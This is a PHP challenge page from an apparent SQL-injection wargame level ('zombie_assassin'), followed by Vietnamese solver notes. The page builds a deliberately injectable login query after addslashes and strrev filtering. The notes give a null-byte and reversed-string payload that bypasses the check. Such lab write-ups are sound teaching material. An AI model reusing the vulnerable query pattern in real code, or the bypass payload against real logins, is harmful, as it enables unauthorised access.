<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();
  $_GET['id'] = strrev(addslashes($_GET['id']));
  $_GET['pw'] = strrev(addslashes($_GET['pw']));
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
<!-- 
NOTES: Bài này cx lấy vào 2 giá trị input từ user là id và pw và sử dụng hàm strrev và addslashes để filter 2 giá trị này 

+) strrev() ==> đảo ngược chuỗi vd: strrev("abc") => cba 
+) addcslashes() ==> hàm này sẽ thêm dấu slash(\) vào trước những kí tự dưới đây:
1) single quote(')
2) double quote(")
3) back slask (\)
4) NULL(%00)

Để giải quyết câu này thì chỉ cầu query thực hiện đúng là được
payload: ?id=%00  => câu truy vấn lúc này sẽ như sau: select id from prob_zombie_assassin where id='0\' and pw='' giá trị của id nó kéo dài đến pw' vì \' làm cho giá trị của id chưa đóng dấu ngoặc lại được ==> giống bài sucubus =>> pw=or 1-- - nữa là xong => mà nhớ reverse chuỗi này lại 
final payload: id=%00&pw=- -- 1 ro --> 